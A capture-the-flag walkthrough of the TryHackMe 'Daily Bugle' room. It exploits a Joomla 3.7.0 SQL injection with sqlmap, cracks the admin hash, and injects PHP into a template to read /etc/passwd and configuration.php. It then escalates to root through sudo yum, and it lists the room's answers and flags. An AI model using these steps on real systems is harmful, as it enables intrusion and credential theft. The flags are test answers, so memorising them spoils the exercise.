# Daily Bugle Walkthrough
### Link
- https://tryhackme.com/room/dailybugle
---
### Task 1 - Deploy
**Question**
###### Who robbed the bank?
**Answer**
###### spiderman
---
### Task 2 - Obtain user and root
1. Reco
- NMAP
```shell
nmap -sC -sV [IP] 
Result:
--> Port 22/80/3306 opened
--> Port 3306: MariaDB
```
[DailyBugle_1.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_1.png)
- Gobuster
```
gobuster dir -u http://[IP]:80 -w [path to wordlist]
Directories found:
/images
/templates
/media
/modules
/bin
/plugins
/includes
/language
/components
/cache
/libraries
/tmp
/layouts
/administrator
```
[DailyBugle_2.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_2.png)
- Joomscan

We know **Joomla** is installed.
We have an interesting tool : joomscan (https://www.kali.org/tools/joomscan/)

```
joomscan -u [IP]
```
[DailyBugle_3.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_3.png)

**Question**
###### What is the Joomla version?
**Answer**
###### Joomla 3.7.0

2. Find and use an exploit

With the Joomla version, we can try to find an exploit
```
searchsploit joomla 3.7.0
Result:
Joomla! 3.7.0 - 'com_fields' SQL Injection         | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Sit | php/webapps/43488.txt
```

So let's now focus on the first one : SQL Injection
Explore the txt file to understand the exploit
```
searchsploit -x php/webapps/42033.txt
```
[DailyBugle_4.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_4.png)
We have a beautiful sqlmap commandline to help us ^_^

3. SQLMAP 
```
SQLMAP:
sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```
*Info* : I don't use the option *--level=5* to perform the command to obtain the result more faster.
[DailyBugle_5.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_5.png)

Now, let's check all tables 
```
sqlmap -u "http://10.10.59.102/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --random-agent --dbs -p list[fullordering] --threads 10 -D joomla --tables
```
[DailyBugle_6.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_6.png)

We found too many tables: 72
Let's focus on __schemas , __session , __users , __user_keys
After few research, only **__users** give us interesting informaiton.
```
sqlmap -u "http://10.10.27.8/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --random-agent --dbs -p list[fullordering] --threads 10 -D joomla -T "#__users" --dump

Result:
+-----+------------+---------------------+---------+--------------------------------------------------------------+----------+
| id  | name       | email               | params  | password                                                     | username |
+-----+------------+---------------------+---------+--------------------------------------------------------------+----------+
| 811 | Super User | jonah@tryhackme.com | <blank> | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm | jonah    |
+-----+------------+---------------------+---------+--------------------------------------------------------------+----------+
```
[DailyBugle_7.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_7.png)

We have the hash password for the **Super User** : jonah

4. Decrypt the password
- Firt : find the hash type
**$2y$**10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm 
- Second : search in Internet what is this type
**bcrypt**
- Thrid : Use john and decrypt the password
    - Create a file and copy/paste the hash
    - Use john
```
john -format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash_jonah
```
[DailyBugle_8.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_8.png)

**Question**
###### What is Jonah's cracked password?
**Answer**
###### spiderman123

5. Joomla

Let's navigate in the administration portal.
User --> just jonah is here with super user privileges
User Groups --> Only 1 user (Jonah) is here
[DailyBugle_9.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_9.png)

Now let's move to **Configuration/Global** --> Nothing really special
Move to **Configuration/Templates** --> **One Template is used for allpages: Protostar**. Good information. We probably use this template to gather more informaiton.
[DailyBugle_10.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_10.png)

We can edit this template to see if we can exploit it by adding some code. 

For that: 
- Click on Templates and select Protostar [DailyBugle_11.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_11.png)
- Edit index.php [DailyBugle_12.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_12.png)
- Add the line [DailyBugle_13.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_13.png): 
```
system("cat /etc/passwd")
```
- Save and refresh the Home page
**Finding** : Jonah Jameson:/home/jjameson:/bin/bash

Now we can try to find some information in configuration.php
- Add the line : 
```
system("cat configuration.php")
```
**Finding** : public $user = 'root'; public $password = 'nv5uz9r3ZEDzVjNu'

6. SSH

With the user **jjameson** and this password **nv5uz9r3ZEDzVjNu**, we can SSH the server.
[DailyBugle_14.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_14.png)
**Question**
###### What is the user flag?
**Answer**
###### 27a260fe3cba712cfdedb1c86d80442e

7. Privilege escalation

- First: check what actions can do jjameson [DailyBugle_15.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_15.png)
```
sudo -l
Result: jjameson can execute yum
```
- Second: check https://gtfobins.github.io/gtfobins/yum/
- Third: Create a file and copy/paste all command from the website [DailyBugle_16.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_16.png)
- Fourth : Make this file executable
```
chmod +x yum.sh
```
- Fifth : execute
```
./yum.sh
```
- Sixth: We are **root**
[DailyBugle_17.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_17.png)
**Question**
###### What is the root flag?
**Answer**
###### eec3d53292b1821868266858d7fa6f79





